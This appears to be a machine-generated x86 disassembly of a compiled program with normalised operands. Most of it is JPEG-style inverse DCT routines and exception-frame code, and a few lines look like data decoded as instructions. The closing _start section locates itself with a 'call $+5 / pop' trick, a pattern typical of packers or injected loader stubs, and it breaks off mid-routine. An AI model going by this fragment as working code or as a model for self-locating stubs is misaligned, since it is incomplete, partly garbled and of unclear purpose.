mov [ eax + 0x40 ] edx
mov [ eax + 0x60 ] edx
mov [ eax + 0x80 ] edx
mov [ eax + 0xa0 ] edx
mov [ eax + 0xc0 ] edx
mov [ eax + 0xe0 ] edx
add [ ebp - 0x28 ] 0x2
add [ ebp - 0x2c ] 0x4
add eax 0x4
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov cx [ edx + 0x10 ]
mov edx [ ebp - 0x28 ]
or cx [ edx + 0x20 ]
mov edx [ ebp - 0x28 ]
or cx [ edx + 0x30 ]
mov edx [ ebp - 0x28 ]
or cx [ edx + 0x40 ]
mov edx [ ebp - 0x28 ]
or cx [ edx + 0x50 ]
mov edx [ ebp - 0x28 ]
or cx [ edx + 0x60 ]
mov edx [ ebp - 0x28 ]
or cx [ edx + 0x70 ]
jne r-xdata
lea eax [ ebp - 0x13c ]
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov edx [ ebp + 0xc ]
mov ecx edx
mov [ ebp - 0x3c ] ecx
dec [ ebp - 0x38 ]
cmp [ ebp - 0x38 ] 0x0
jg r-xdata
mov edx [ eax + 0x8 ]
mov [ ebp - 0x1c ] edx
mov edx [ eax + 0x18 ]
mov ecx [ ebp - 0x1c ]
add ecx edx
mov esi [ ebp - 0x1c ]
mov ebx ecx
shl ebx 0x4
add ebx ecx
lea ebx [ ecx + ebx * 4 ]
lea ebx [ ecx + ebx * 4 ]
shl ebx 0x4
add ebx ecx
mov ecx edx
neg ecx
shl ecx 0x4
add ecx edx
lea ecx [ edx + ecx * 4 ]
shl ecx 0x3
sub ecx edx
shl ecx 0x5
sub ecx edx
mov edx esi
add ecx ebx
lea esi [ edx + esi * 2 ]
shl esi 0x4
add esi edx
shl esi 0x6
sub esi edx
mov edx [ eax ]
add esi esi
mov edi edx
add esi ebx
mov ebx [ eax + 0x10 ]
add edi ebx
sub edx ebx
shl edi 0xd
shl edx 0xd
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x4 ]
add edx esi
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x4 ]
sub edx esi
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x8 ]
sub edx ecx
mov [ ebp - 0x14 ] edx
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x4 ] ecx
mov edx [ eax + 0x14 ]
mov [ ebp - 0x8 ] edx
mov ecx [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov esi [ eax + 0x4 ]
add edx ecx
mov ebx [ ebp - 0x4 ]
mov [ ebp - 0x1c ] edx
mov edi [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add edi esi
add edx ecx
mov [ ebp - 0x20 ] edi
add ebx esi
mov edi [ ebp - 0x20 ]
imul ebx ebx 0xffffe333
add edi edx
imul edi edi 0x25a1
mov [ ebp - 0x24 ] edi
imul edi [ ebp - 0x4 ] 0x98e
mov [ ebp - 0x4 ] edi
imul edi [ ebp - 0x8 ] 0x41b3
mov [ ebp - 0x8 ] edi
mov edi esi
imul ecx ecx 0x6254
lea esi [ edi + esi * 2 ]
shl esi 0x9
add esi edi
lea esi [ edi + esi * 4 ]
lea esi [ edi + esi * 2 ]
imul edi [ ebp - 0x1c ] 0xffffadfd
mov [ ebp - 0x1c ] edi
mov edi edx
neg edx
shl edx 0x6
add edx edi
lea edx [ edi + edx * 4 ]
shl edx 0x4
sub edx edi
shl edx 0x2
sub edx edi
imul edi [ ebp - 0x20 ] 0xfffff384
mov [ ebp - 0x20 ] edi
add edx [ ebp - 0x24 ]
mov edi [ ebp - 0x24 ]
add [ ebp - 0x20 ] edi
lea edi [ edx + ebx ]
add [ ebp - 0x4 ] edi
mov edi [ ebp - 0x1c ]
add edi [ ebp - 0x20 ]
add [ ebp - 0x8 ] edi
add edx [ ebp - 0x1c ]
add ebx [ ebp - 0x20 ]
add ecx edx
add esi ebx
mov edx [ ebp - 0xc ]
mov ebx [ ebp - 0x34 ]
add edx esi
add edx 0x20000
sar edx 0x12
and edx 0x3ff
mov dl [ ebx + edx ]
mov ebx [ ebp - 0x30 ]
mov [ ebx ] dl
mov edx [ ebp - 0xc ]
mov ebx [ ebp - 0x34 ]
sub edx esi
add edx 0x20000
sar edx 0x12
and edx 0x3ff
mov dl [ ebx + edx ]
mov ebx [ ebp - 0x30 ]
mov [ ebx + 0x7 ] dl
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0x34 ]
add edx ecx
add edx 0x20000
sar edx 0x12
and edx 0x3ff
mov dl [ ebx + edx ]
mov ebx [ ebp - 0x30 ]
mov [ ebx + 0x1 ] dl
mov edx [ ebp - 0x10 ]
sub edx ecx
mov ecx [ ebp - 0x34 ]
add edx 0x20000
sar edx 0x12
and edx 0x3ff
mov dl [ ecx + edx ]
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x6 ] dl
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x34 ]
add edx [ ebp - 0x8 ]
add edx 0x20000
sar edx 0x12
and edx 0x3ff
mov dl [ ecx + edx ]
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x2 ] dl
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x34 ]
sub edx [ ebp - 0x8 ]
add edx 0x20000
sar edx 0x12
and edx 0x3ff
mov dl [ ecx + edx ]
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x5 ] dl
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x34 ]
add edx [ ebp - 0x4 ]
add edx 0x20000
sar edx 0x12
and edx 0x3ff
mov dl [ ecx + edx ]
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x3 ] dl
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x34 ]
sub edx [ ebp - 0x4 ]
add edx 0x20000
sar edx 0x12
and edx 0x3ff
add eax 0x20
mov dl [ ecx + edx ]
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x4 ] dl
mov ecx [ eax ]
mov edx [ ebp - 0x34 ]
add ecx 0x10
sar ecx 0x5
and ecx 0x3ff
add eax 0x20
mov dl [ edx + ecx ]
mov ecx [ ebp - 0x30 ]
mov [ ecx ] dl
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x1 ] dl
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x2 ] dl
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x3 ] dl
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x4 ] dl
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x5 ] dl
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x6 ] dl
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x7 ] dl
jmp r-xdata
mov edx [ ebp - 0x3c ]
mov ecx [ edx ]
add ecx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov edx [ eax + 0x4 ]
or edx [ eax + 0x8 ]
or edx [ eax + 0xc ]
or edx [ eax + 0x10 ]
or edx [ eax + 0x14 ]
or edx [ eax + 0x18 ]
or edx [ eax + 0x1c ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc [ ebp - 0x38 ]
add [ ebp - 0x3c ] 0x4
cmp [ ebp - 0x38 ] 0x8
jl r-xdata
sub_46c5ec
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4666b4
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
mov eax ebx
call sub_468ae4
cmp [ ebx + 0xac ] 0x0
je r-xdata
mov eax ebx
call sub_467a80
mov eax ebx
call sub_46846c
xor edx edx
mov eax ebx
call sub_466d6c
cmp [ ebx + 0xd9 ] 0x0
je r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x1
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
call sub_46a1a0
mov eax ebx
call sub_46961c
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x1
jg r-xdata
mov edx 0x1
cmp [ ebx + 0xb0 ] 0x0
jne r-xdata
xor edx edx
jmp r-xdata
mov eax ebx
call sub_46757c
xor edx edx
mov eax ebx
call sub_466854
mov eax ebx
call sub_465bf8
mov eax ebx
mov edx [ eax + 0x4 ]
call [ edx + 0x18 ]
mov eax ebx
mov edx [ eax + 0x151 ]
call [ edx + 0x4 ]
pop ebx
retn
sub_46c69c
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov [ esp ] eax
mov eax [ esp ]
mov [ esp + 0x20 ] 0x7
mov ecx [ eax ]
mov ebx [ eax + 0x1c ]
mov edx ecx
mov esi ecx
sub esi ebx
add edx ebx
mov ebx [ eax + 0x4 ]
mov edi [ eax + 0x18 ]
mov ecx ebx
sub ebx edi
add ecx edi
mov edi ebx
mov ebx [ eax + 0x8 ]
mov ebp [ eax + 0x8 ]
add ebx [ eax + 0x14 ]
sub ebp [ eax + 0x14 ]
mov [ esp + 0xc ] ebp
mov ebp [ eax + 0xc ]
add ebp [ eax + 0x10 ]
mov [ esp + 0x4 ] ebp
mov ebp [ eax + 0xc ]
sub ebp [ eax + 0x10 ]
mov [ esp + 0x8 ] ebp
mov ebp [ esp + 0x4 ]
add ebp edx
mov [ esp + 0x10 ] ebp
sub edx [ esp + 0x4 ]
mov [ esp + 0x14 ] edx
lea edx [ ebx + ecx ]
sub ecx ebx
mov ebx [ esp + 0x10 ]
add ebx edx
shl ebx 0x2
mov [ eax ] ebx
mov ebx [ esp + 0x10 ]
sub ebx edx
shl ebx 0x2
mov [ eax + 0x10 ] ebx
mov edx [ esp + 0x14 ]
add edx ecx
mov ebx edx
shl edx 0x4
add edx ebx
lea edx [ ebx + edx * 4 ]
lea edx [ ebx + edx * 4 ]
shl edx 0x4
add edx ebx
mov ebx [ esp + 0x14 ]
mov ebp ebx
lea ebx [ ebp + ebx * 2 ]
shl ebx 0x4
add ebx ebp
shl ebx 0x6
sub ebx ebp
add ebx ebx
add ebx edx
add ebx 0x400
sar ebx 0xb
mov [ eax + 0x8 ] ebx
mov ebx ecx
neg ecx
shl ecx 0x4
add ecx ebx
lea ecx [ ebx + ecx * 4 ]
shl ecx 0x3
sub ecx ebx
shl ecx 0x5
sub ecx ebx
add edx ecx
add edx 0x400
sar edx 0xb
mov [ eax + 0x18 ] edx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
add ecx edi
add edx esi
mov [ esp + 0x18 ] ecx
imul edx edx 0xffffe333
mov ecx [ esp + 0x8 ]
mov ebx [ esp + 0xc ]
add ebx esi
add ecx edi
imul edi edi 0x6254
lea ebp [ ebx + ecx ]
imul ebp ebp 0x25a1
mov [ esp + 0x1c ] ebp
imul ebp [ esp + 0x8 ] 0x98e
mov [ esp + 0x8 ] ebp
imul ebp [ esp + 0xc ] 0x41b3
mov [ esp + 0xc ] ebp
mov ebp esi
lea esi [ ebp + esi * 2 ]
shl esi 0x9
add esi ebp
lea esi [ ebp + esi * 4 ]
lea esi [ ebp + esi * 2 ]
imul ebp [ esp + 0x18 ] 0xffffadfd
mov [ esp + 0x18 ] ebp
mov ebp ecx
neg ecx
shl ecx 0x6
add ecx ebp
lea ecx [ ebp + ecx * 4 ]
shl ecx 0x4
sub ecx ebp
shl ecx 0x2
sub ecx ebp
mov ebp ebx
neg ebx
add ecx [ esp + 0x1c ]
lea ebx [ ebp + ebx * 4 ]
shl ebx 0x3
sub ebx ebp
shl ebx 0x5
add ebx ebp
mov ebp [ esp + 0x8 ]
add ebp edx
add edx esi
add ebp ecx
shl ebx 0x2
add ebp 0x400
add ebx [ esp + 0x1c ]
sar ebp 0xb
mov [ eax + 0x1c ] ebp
mov ebp [ esp + 0xc ]
add ebp [ esp + 0x18 ]
add ebp ebx
add ebx edx
add ebp 0x400
add ebx 0x400
sar ebp 0xb
mov [ eax + 0x14 ] ebp
add edi [ esp + 0x18 ]
add ecx edi
add ecx 0x400
sar ecx 0xb
sar ebx 0xb
mov [ eax + 0xc ] ecx
mov [ eax + 0x4 ] ebx
add eax 0x20
dec [ esp + 0x20 ]
cmp [ esp + 0x20 ] 0x0
jge r-xdata
mov eax [ esp ]
mov [ esp + 0x20 ] 0x7
mov ecx [ eax ]
mov ebx [ eax + 0xe0 ]
mov edx ecx
mov esi ecx
sub esi ebx
add edx ebx
mov ebx [ eax + 0x20 ]
mov edi [ eax + 0xc0 ]
mov ecx ebx
sub ebx edi
add ecx edi
mov edi ebx
mov ebx [ eax + 0x40 ]
mov ebp [ eax + 0x40 ]
add ebx [ eax + 0xa0 ]
sub ebp [ eax + 0xa0 ]
mov [ esp + 0xc ] ebp
mov ebp [ eax + 0x60 ]
add ebp [ eax + 0x80 ]
mov [ esp + 0x4 ] ebp
mov ebp [ eax + 0x60 ]
sub ebp [ eax + 0x80 ]
mov [ esp + 0x8 ] ebp
mov ebp [ esp + 0x4 ]
add ebp edx
mov [ esp + 0x10 ] ebp
sub edx [ esp + 0x4 ]
mov [ esp + 0x14 ] edx
lea edx [ ebx + ecx ]
sub ecx ebx
mov ebx [ esp + 0x10 ]
add ebx edx
add ebx 0x2
sar ebx 0x2
mov [ eax ] ebx
mov ebx [ esp + 0x10 ]
sub ebx edx
add ebx 0x2
sar ebx 0x2
mov [ eax + 0x80 ] ebx
mov edx [ esp + 0x14 ]
add edx ecx
mov ebx edx
shl edx 0x4
add edx ebx
lea edx [ ebx + edx * 4 ]
lea edx [ ebx + edx * 4 ]
shl edx 0x4
add edx ebx
mov ebx [ esp + 0x14 ]
mov ebp ebx
lea ebx [ ebp + ebx * 2 ]
shl ebx 0x4
add ebx ebp
shl ebx 0x6
sub ebx ebp
add ebx ebx
add ebx edx
add ebx 0x4000
sar ebx 0xf
mov [ eax + 0x40 ] ebx
mov ebx ecx
neg ecx
shl ecx 0x4
add ecx ebx
lea ecx [ ebx + ecx * 4 ]
shl ecx 0x3
sub ecx ebx
shl ecx 0x5
sub ecx ebx
add edx ecx
add edx 0x4000
sar edx 0xf
mov [ eax + 0xc0 ] edx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
add ecx edi
add edx esi
mov [ esp + 0x18 ] ecx
imul edx edx 0xffffe333
mov ecx [ esp + 0x8 ]
mov ebx [ esp + 0xc ]
add ebx esi
add ecx edi
imul edi edi 0x6254
lea ebp [ ebx + ecx ]
imul ebp ebp 0x25a1
mov [ esp + 0x1c ] ebp
imul ebp [ esp + 0x8 ] 0x98e
mov [ esp + 0x8 ] ebp
imul ebp [ esp + 0xc ] 0x41b3
mov [ esp + 0xc ] ebp
mov ebp esi
lea esi [ ebp + esi * 2 ]
shl esi 0x9
add esi ebp
lea esi [ ebp + esi * 4 ]
lea esi [ ebp + esi * 2 ]
imul ebp [ esp + 0x18 ] 0xffffadfd
mov [ esp + 0x18 ] ebp
mov ebp ecx
neg ecx
shl ecx 0x6
add ecx ebp
lea ecx [ ebp + ecx * 4 ]
shl ecx 0x4
sub ecx ebp
shl ecx 0x2
sub ecx ebp
mov ebp ebx
neg ebx
add ecx [ esp + 0x1c ]
lea ebx [ ebp + ebx * 4 ]
shl ebx 0x3
sub ebx ebp
shl ebx 0x5
add ebx ebp
mov ebp [ esp + 0x8 ]
add ebp edx
add edx esi
add ebp ecx
shl ebx 0x2
add ebp 0x4000
add ebx [ esp + 0x1c ]
sar ebp 0xf
mov [ eax + 0xe0 ] ebp
mov ebp [ esp + 0xc ]
add ebp [ esp + 0x18 ]
add ebp ebx
add ebx edx
add ebp 0x4000
add ebx 0x4000
sar ebp 0xf
mov [ eax + 0xa0 ] ebp
add edi [ esp + 0x18 ]
add ecx edi
add ecx 0x4000
sar ecx 0xf
sar ebx 0xf
mov [ eax + 0x60 ] ecx
mov [ eax + 0x20 ] ebx
add eax 0x4
dec [ esp + 0x20 ]
cmp [ esp + 0x20 ] 0x0
jge r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46ca80
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov [ esp ] eax
mov eax [ esp ]
mov [ esp + 0x14 ] 0x7
mov edx [ eax ]
mov ebx [ eax + 0x1c ]
mov ecx edx
mov esi edx
mov edx [ eax + 0x4 ]
sub esi ebx
add ecx ebx
mov edi [ eax + 0x18 ]
mov ebx edx
sub edx edi
mov [ esp + 0x10 ] edx
add ebx edi
mov edx [ eax + 0x8 ]
mov edi [ eax + 0x14 ]
mov ebp edx
sub edx edi
add ebp edi
mov [ esp + 0x4 ] ebp
mov [ esp + 0xc ] edx
mov edx [ eax + 0xc ]
mov edi edx
add edi [ eax + 0x10 ]
sub edx [ eax + 0x10 ]
mov [ esp + 0x8 ] edx
lea edx [ edi + ecx ]
sub ecx edi
mov edi ecx
mov ecx [ esp + 0x4 ]
add ecx ebx
sub ebx [ esp + 0x4 ]
lea ebp [ ecx + edx ]
sub edx ecx
mov [ eax ] ebp
mov [ eax + 0x10 ] edx
lea edx [ edi + ebx ]
mov ecx edx
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 2 ]
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 4 ]
sar edx 0x8
lea ecx [ edx + edi ]
sub edi edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x18 ] edi
mov edx [ esp + 0x8 ]
mov ebx [ esp + 0x10 ]
add edx [ esp + 0xc ]
add ebx esi
mov edi edx
mov ecx [ esp + 0xc ]
sub edi ebx
add ecx [ esp + 0x10 ]
mov ebp edi
lea edi [ ebp + edi * 2 ]
shl edi 0x4
add edi ebp
mov ebp edx
shl edx 0x4
add edi edi
add edx ebp
sar edi 0x8
lea edx [ ebp + edx * 4 ]
lea edx [ ebp + edx * 2 ]
mov ebp ebx
sar edx 0x8
add edx edi
lea ebx [ ebp + ebx * 4 ]
lea ebx [ ebp + ebx * 4 ]
shl ebx 0x3
sub ebx ebp
add ebx ebx
sar ebx 0x8
add edi ebx
mov ebx edi
mov edi ecx
lea ecx [ edi + ecx * 4 ]
lea ecx [ edi + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
sar ecx 0x8
lea edi [ ecx + esi ]
sub esi ecx
mov ecx esi
lea esi [ edx + ecx ]
sub ecx edx
mov [ eax + 0x14 ] esi
mov [ eax + 0xc ] ecx
lea edx [ ebx + edi ]
sub edi ebx
mov [ eax + 0x4 ] edx
mov [ eax + 0x1c ] edi
dec [ esp + 0x14 ]
add eax 0x20
cmp [ esp + 0x14 ] 0x0
jge r-xdata
mov eax [ esp ]
mov [ esp + 0x14 ] 0x7
mov edx [ eax ]
mov ebx [ eax + 0xe0 ]
mov ecx edx
mov esi edx
sub esi ebx
add ecx ebx
mov ebx [ eax + 0x20 ]
mov edx [ eax + 0x20 ]
add ebx [ eax + 0xc0 ]
sub edx [ eax + 0xc0 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0xa0 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x40 ]
sub edx [ eax + 0xa0 ]
mov [ esp + 0xc ] edx
mov edi [ eax + 0x60 ]
mov edx [ eax + 0x60 ]
add edi [ eax + 0x80 ]
sub edx [ eax + 0x80 ]
mov [ esp + 0x8 ] edx
lea edx [ edi + ecx ]
sub ecx edi
mov edi ecx
mov ecx [ esp + 0x4 ]
add ecx ebx
sub ebx [ esp + 0x4 ]
lea ebp [ ecx + edx ]
sub edx ecx
mov [ eax ] ebp
mov [ eax + 0x80 ] edx
lea edx [ edi + ebx ]
mov ecx edx
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 2 ]
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 4 ]
sar edx 0x8
lea ecx [ edx + edi ]
sub edi edx
mov [ eax + 0x40 ] ecx
mov [ eax + 0xc0 ] edi
mov edx [ esp + 0x8 ]
mov ebx [ esp + 0x10 ]
add edx [ esp + 0xc ]
add ebx esi
mov edi edx
mov ecx [ esp + 0xc ]
sub edi ebx
add ecx [ esp + 0x10 ]
mov ebp edi
lea edi [ ebp + edi * 2 ]
shl edi 0x4
add edi ebp
mov ebp edx
shl edx 0x4
add edi edi
add edx ebp
sar edi 0x8
lea edx [ ebp + edx * 4 ]
lea edx [ ebp + edx * 2 ]
mov ebp ebx
sar edx 0x8
add edx edi
lea ebx [ ebp + ebx * 4 ]
lea ebx [ ebp + ebx * 4 ]
shl ebx 0x3
sub ebx ebp
add ebx ebx
sar ebx 0x8
add edi ebx
mov ebx edi
mov edi ecx
lea ecx [ edi + ecx * 4 ]
lea ecx [ edi + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
sar ecx 0x8
lea edi [ ecx + esi ]
sub esi ecx
mov ecx esi
lea esi [ edx + ecx ]
sub ecx edx
mov [ eax + 0xa0 ] esi
mov [ eax + 0x60 ] ecx
lea edx [ ebx + edi ]
sub edi ebx
mov [ eax + 0x20 ] edx
mov [ eax + 0xe0 ] edi
dec [ esp + 0x14 ]
add eax 0x4
cmp [ esp + 0x14 ] 0x0
jge r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46ccec
add esp 0xffffffb4
mov edx eax
mov ecx 0x7
fld [ edx ]
fadd [ edx + 0x1c ]
fstp [ esp ]
fld [ edx ]
fsub [ edx + 0x1c ]
fstp [ esp + 0x1c ]
fld [ edx + 0x4 ]
fadd [ edx + 0x18 ]
fstp [ esp + 0x4 ]
fld [ edx + 0x4 ]
fsub [ edx + 0x18 ]
fstp [ esp + 0x18 ]
fld [ edx + 0x8 ]
fadd [ edx + 0x14 ]
fstp [ esp + 0x8 ]
fld [ edx + 0x8 ]
fsub [ edx + 0x14 ]
fstp [ esp + 0x14 ]
fld [ edx + 0xc ]
fadd [ edx + 0x10 ]
fstp [ esp + 0xc ]
fld [ edx + 0xc ]
fsub [ edx + 0x10 ]
fstp [ esp + 0x10 ]
fld [ esp ]
fadd [ esp + 0xc ]
fstp [ esp + 0x20 ]
fld [ esp ]
fsub [ esp + 0xc ]
fstp [ esp + 0x2c ]
fld [ esp + 0x4 ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x24 ]
fld [ esp + 0x4 ]
fsub [ esp + 0x8 ]
fstp [ esp + 0x28 ]
fld [ esp + 0x20 ]
fadd [ esp + 0x24 ]
fstp [ edx ]
fld [ esp + 0x20 ]
fsub [ esp + 0x24 ]
fstp [ edx + 0x10 ]
fld [ esp + 0x28 ]
fadd [ esp + 0x2c ]
fmul [ r-xdata ]
fstp [ esp + 0x30 ]
fld [ esp + 0x2c ]
fadd [ esp + 0x30 ]
fstp [ edx + 0x8 ]
fld [ esp + 0x2c ]
fsub [ esp + 0x30 ]
fstp [ edx + 0x18 ]
fld [ esp + 0x10 ]
fadd [ esp + 0x14 ]
fstp [ esp + 0x20 ]
fld [ esp + 0x14 ]
fadd [ esp + 0x18 ]
fstp [ esp + 0x24 ]
fld [ esp + 0x18 ]
fadd [ esp + 0x1c ]
fstp [ esp + 0x28 ]
fld [ esp + 0x20 ]
fsub [ esp + 0x28 ]
fmul [ r-xdata ]
fstp [ esp + 0x40 ]
fld [ r-xdata ]
fmul [ esp + 0x20 ]
fadd [ esp + 0x40 ]
fstp [ esp + 0x34 ]
fld [ r-xdata ]
fmul [ esp + 0x28 ]
fadd [ esp + 0x40 ]
fstp [ esp + 0x3c ]
fld [ esp + 0x24 ]
fmul [ r-xdata ]
fstp [ esp + 0x38 ]
fld [ esp + 0x1c ]
fadd [ esp + 0x38 ]
fstp [ esp + 0x44 ]
fld [ esp + 0x1c ]
fsub [ esp + 0x38 ]
fstp [ esp + 0x48 ]
fld [ esp + 0x48 ]
fadd [ esp + 0x34 ]
fstp [ edx + 0x14 ]
fld [ esp + 0x48 ]
fsub [ esp + 0x34 ]
fstp [ edx + 0xc ]
fld [ esp + 0x44 ]
fadd [ esp + 0x3c ]
fstp [ edx + 0x4 ]
fld [ esp + 0x44 ]
fsub [ esp + 0x3c ]
fstp [ edx + 0x1c ]
add edx 0x20
dec ecx
test ecx ecx
jge r-xdata
mov edx eax
mov ecx 0x7
fld [ edx ]
fadd [ edx + 0xe0 ]
fstp [ esp ]
fld [ edx ]
fsub [ edx + 0xe0 ]
fstp [ esp + 0x1c ]
fld [ edx + 0x20 ]
fadd [ edx + 0xc0 ]
fstp [ esp + 0x4 ]
fld [ edx + 0x20 ]
fsub [ edx + 0xc0 ]
fstp [ esp + 0x18 ]
fld [ edx + 0x40 ]
fadd [ edx + 0xa0 ]
fstp [ esp + 0x8 ]
fld [ edx + 0x40 ]
fsub [ edx + 0xa0 ]
fstp [ esp + 0x14 ]
fld [ edx + 0x60 ]
fadd [ edx + 0x80 ]
fstp [ esp + 0xc ]
fld [ edx + 0x60 ]
fsub [ edx + 0x80 ]
fstp [ esp + 0x10 ]
fld [ esp ]
fadd [ esp + 0xc ]
fstp [ esp + 0x20 ]
fld [ esp ]
fsub [ esp + 0xc ]
fstp [ esp + 0x2c ]
fld [ esp + 0x4 ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x24 ]
fld [ esp + 0x4 ]
fsub [ esp + 0x8 ]
fstp [ esp + 0x28 ]
fld [ esp + 0x20 ]
fadd [ esp + 0x24 ]
fstp [ edx ]
fld [ esp + 0x20 ]
fsub [ esp + 0x24 ]
fstp [ edx + 0x80 ]
fld [ esp + 0x28 ]
fadd [ esp + 0x2c ]
fmul [ r-xdata ]
fstp [ esp + 0x30 ]
fld [ esp + 0x2c ]
fadd [ esp + 0x30 ]
fstp [ edx + 0x40 ]
fld [ esp + 0x2c ]
fsub [ esp + 0x30 ]
fstp [ edx + 0xc0 ]
fld [ esp + 0x10 ]
fadd [ esp + 0x14 ]
fstp [ esp + 0x20 ]
fld [ esp + 0x14 ]
fadd [ esp + 0x18 ]
fstp [ esp + 0x24 ]
fld [ esp + 0x18 ]
fadd [ esp + 0x1c ]
fstp [ esp + 0x28 ]
fld [ esp + 0x20 ]
fsub [ esp + 0x28 ]
fmul [ r-xdata ]
fstp [ esp + 0x40 ]
fld [ r-xdata ]
fmul [ esp + 0x20 ]
fadd [ esp + 0x40 ]
fstp [ esp + 0x34 ]
fld [ r-xdata ]
fmul [ esp + 0x28 ]
fadd [ esp + 0x40 ]
fstp [ esp + 0x3c ]
fld [ esp + 0x24 ]
fmul [ r-xdata ]
fstp [ esp + 0x38 ]
fld [ esp + 0x1c ]
fadd [ esp + 0x38 ]
fstp [ esp + 0x44 ]
fld [ esp + 0x1c ]
fsub [ esp + 0x38 ]
fstp [ esp + 0x48 ]
fld [ esp + 0x48 ]
fadd [ esp + 0x34 ]
fstp [ edx + 0xa0 ]
fld [ esp + 0x48 ]
fsub [ esp + 0x34 ]
fstp [ edx + 0x60 ]
fld [ esp + 0x44 ]
fadd [ esp + 0x3c ]
fstp [ edx + 0x20 ]
fld [ esp + 0x44 ]
fsub [ esp + 0x3c ]
fstp [ edx + 0xe0 ]
add edx 0x4
dec ecx
test ecx ecx
jge r-xdata
add esp 0x4c
retn
sub_46d018
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46d04f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d056
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_412274
sub_46d058
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push j_sub_44c770
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d0e7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_44cb04
retn
call sub_46b79c
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_412248
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax [ r-xdata ]
call sub_412248
sub_46d0ff
inc [ ebx ]
add [ eax ] al
add [ edx + 0x70 ] ch
add [ si + 0x4735 ] bh
add [ ebp - 0x1 ] dl
add [ eax ] al
mov esp 0x56004735
inc [ eax ]
add [ ebp + esi - 0xa8ffb9 ] bh
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46d145
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d14c
retn
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call $+5
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_5cafe0
add esp 0x4
call sub_5cb110
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_5cb140
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
